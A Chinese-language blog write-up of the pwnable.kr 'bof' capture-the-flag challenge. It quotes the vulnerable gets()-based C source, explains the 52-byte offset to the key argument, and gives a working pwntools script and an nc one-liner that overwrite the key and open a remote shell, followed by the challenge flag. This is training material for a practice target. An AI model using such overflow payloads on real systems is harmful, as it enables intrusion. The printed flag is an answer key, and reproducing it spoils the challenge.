---
layout: post
title: "pwnable.kr bof"
date: 2018-05-19 
tag: pwn Writeup pwnable.kr
---

> Nana told me that buffer overflow is one of the most common software vulnerability.  
> Is that true?  
>
> Download : <http://pwnable.kr/bin/bof>  
> Download : <http://pwnable.kr/bin/bof.c>  
>
> Running at : nc pwnable.kr 9000

先看一下给的源码

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);   // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

大概的思路就是向overflowme进行输入时溢出将key覆盖成0xcafebabe就行了。

用ida观察，我们可以知道 key(a1)在 ebp+8h, overflowme(s)在ebp-2Ch,之间有52字节，最后再加上需要覆盖的4字节就OK了。

![img_1](/images/posts/pwnable.kr/bof_1.png)

下面给出exp

```python
from pwn import *

# p = process("bof")
p = remote('pwnable.kr',9000)

payload = 'a'*52 + p32(0xcafebabe)

p.sendline(payload)

p.interactive()
```

网上还看见一个更简单的`(python -c "print 'a'*52 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000` 。

这里大家一定疑惑加`cat`干嘛。这里如果我们不加上cat那么nc在传完python的输出后就完成了这条命令，会直接结束这次会话。我们加上cat后nc的这个会话会永不结束，直到用户输入Ctrl+C。然后cat又比较特殊，它可以将用户输入原封不动返回并重定向给了nc。

flag: daddy, I just pwned a buFFer :)